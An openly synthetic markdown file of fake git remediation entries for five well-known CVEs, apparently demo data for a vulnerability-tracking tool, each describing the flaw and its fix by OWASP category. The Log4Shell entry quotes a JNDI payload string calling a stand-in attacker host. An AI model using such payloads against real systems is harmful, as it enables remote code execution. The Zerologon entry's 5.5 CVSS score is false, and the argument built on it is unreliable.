# git_history/synthetic_fixes.md

> ⚠️ **PLACEHOLDER / SYNTHETIC DATA — NOT A REAL GIT LOG**
> Every entry below is fabricated for demo purposes only, to illustrate what a
> remediation trail could look like once WSVIA is wired to real commit history.
> Commit hashes, dates, and author fields are fake. Do not treat as an audit
> record.

---

## [SYNTHETIC] Entry 1 — A01:2025 Broken Access Control

```
commit: [synthetic] 7f3a1c9
date: 2024-01-XX (placeholder)
author: [SYNTHETIC — not a real commit]
message: Fix arbitrary file write via IOS XE Web UI (CVE-2023-20198)
```

**Before:** Web UI feature on Cisco IOS XE exposed an unauthenticated path
allowing an attacker to create a local user account with privilege level 15,
then use that access to write arbitrary files to the filesystem.

**After:** Disabled the HTTP/HTTPS Server feature (`no ip http server`,
`no ip http secure-server`) on internet-facing interfaces; applied vendor
patch closing the unauthenticated account-creation path.

**Notes:** CVSS 10.0. Remediation per CVE-2023-20198 vendor advisory —
disable exposed management interface until patched.

---

## [SYNTHETIC] Entry 2 — A02:2025 Security Misconfiguration

```
commit: [synthetic] b82e5d0
date: 2021-03-XX (placeholder)
author: [SYNTHETIC — not a real commit]
message: Restrict Exchange PowerShell backend access (CVE-2021-27065, ProxyLogon chain)
```

**Before:** Exchange Server allowed post-authentication attackers to write
arbitrary files via the PowerShell backend, enabling webshell deployment —
part of the broader ProxyLogon exploit chain.

**After:** Applied Microsoft's out-of-band security update; restricted
PowerShell backend write access and validated file-write paths against an
allow-list.

**Notes:** CVSS 7.8. Config-hardening issue, not a code-logic flaw — file-write
permissions were too permissive by default.

---

## [SYNTHETIC] Entry 3 — A04:2025 Cryptographic Failures

```
commit: [synthetic] 2c9f4a6
date: 2020-01-XX (placeholder)
author: [SYNTHETIC — not a real commit]
message: Fix ECC certificate validation bypass in CryptoAPI ("CurveBall", CVE-2020-0601)
```

**Before:** Windows CryptoAPI (`crypt32.dll`) failed to properly validate
elliptic-curve cryptography certificates, allowing an attacker to spoof a
valid code-signing certificate and sign malicious executables as trusted.

**After:** Patched ECC certificate-chain validation logic to correctly check
curve parameters against the trusted root, closing the spoofing path.

**Notes:** CVSS 8.1. Publicly disclosed by NSA. Classic "crypto implementation
trusted attacker-supplied parameters" failure.

---

## [SYNTHETIC] Entry 4 — A05:2025 Injection

```
commit: [synthetic] a1b2c3d
date: 2021-12-XX (placeholder)
author: [SYNTHETIC — not a real commit]
message: Fix JNDI injection RCE in log message lookup (CVE-2021-44228, "Log4Shell")
```

**Before:** Log4j2 JNDI feature evaluated attacker-controlled strings in log
messages (e.g. `${jndi:ldap://attacker.com/a}`), triggering remote class
loading and arbitrary code execution.

**After:** Disabled message-lookup substitution by default (2.15.0), then
fully removed the JNDI lookup class (2.16.0). Config mitigation:
`log4j2.formatMsgNoLookups=true`.

**Notes:** CVSS 10.0. Highest-profile entry in corpus — good anchor case for
demo narrative.

---

## [SYNTHETIC] Entry 5 — A07:2025 Authentication Failures

```
commit: [synthetic] 9e0d7f2
date: 2020-09-XX (placeholder)
author: [SYNTHETIC — not a real commit]
message: Fix Netlogon cryptographic authentication bypass (CVE-2020-1472, "Zerologon")
```

**Before:** Netlogon Remote Protocol (MS-NRPC) used a flawed AES-CFB8
implementation with an all-zero IV, letting an attacker forge authentication
and reset a domain controller's machine account password — full domain
compromise.

**After:** Enforced secure RPC for all Netlogon connections; patched IV
handling in the authentication handshake.

**Notes:** CVSS 5.5 (deceptively low for real-world severity — full domain
takeover in practice). Good demo talking point: CVSS score alone can
understate actual risk.

---

*(End of synthetic entries. 5 total, one per OWASP category represented in
the current CVE corpus: A01, A02, A04, A05, A07. Categories A03, A06, A08,
A09, A10 have zero CVEs in the corpus and are not represented here.)*